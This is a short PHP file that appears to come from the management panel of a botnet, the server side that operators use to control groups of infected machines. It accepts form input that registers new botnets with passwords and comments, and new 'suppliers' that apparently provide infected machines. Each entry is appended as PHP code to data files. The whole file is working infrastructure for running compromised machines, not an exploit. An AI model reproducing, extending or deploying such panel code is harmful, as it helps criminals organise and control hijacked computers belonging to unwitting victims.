<?php

	if (!BOT) exit();


if (isset($_POST['botnet'])) {
	if (array_key_exists($_POST['botnet'], $BOTNETS))				exit('Botnet name already exist');
	if (strlen($_POST['botnet']) > 12)								exit('Botnet name too long');
	if (!preg_match("/^[a-zA-Z0-9_]+$/", $_POST['botnet']))			exit('Botnet name tabcontains forbidden symbols');
	if (strlen($_POST['passwd']) > 16)								exit('Botnet password too long');
	if (!preg_match("/^[a-zA-Z0-9_]+$/", $_POST['passwd']))			exit('Botnet password tabcontains forbidden symbols');
	if (strlen($_POST['comment']) > 128)							exit('Comment too long');
	if ($_POST['comment']!='' and !preg_match("/^[a-zA-Z0-9\s.,_]+$/", $_POST['comment'])) exit('Comment tabcontains forbidden symbols');

	$fp = fopen('../data/titles/botnets.php', 'a');
	flock($fp, LOCK_EX);
	fwrite ($fp, "	\$BOTNETS['{$_POST['botnet']}'] = array('password' => '{$_POST['passwd']}', 'comment' => '{$_POST['comment']}');\n");
	flock($fp, LOCK_UN);
	fclose ($fp);

	exit('success');
}


if (isset($_POST['supplier'])) {
	if (array_key_exists($_POST['supplier'], $SUPPLIERS))			exit('Supplier name already exist');
	if (strlen($_POST['supplier']) > 12)							exit('Supplier name too long');
	if (!preg_match("/^[a-zA-Z0-9_]+$/", $_POST['supplier']))		exit('Supplier name tabcontains forbidden symbols');
	if (strlen($_POST['comment']) > 128)							exit('Comment too long');
	if ($_POST['comment']!='' and !preg_match("/^[a-zA-Z0-9\s.,_]+$/", $_POST['comment'])) exit('Comment tabcontains forbidden symbols');

	$fp = fopen('../data/titles/suppliers.php', 'a');
	flock($fp, LOCK_EX);
	fwrite ($fp, "	\$SUPPLIERS['{$_POST['supplier']}'] = array('comment' => '{$_POST['comment']}');\n");
	flock($fp, LOCK_UN);
	fclose ($fp);

	exit('success');
}


	exit();

?>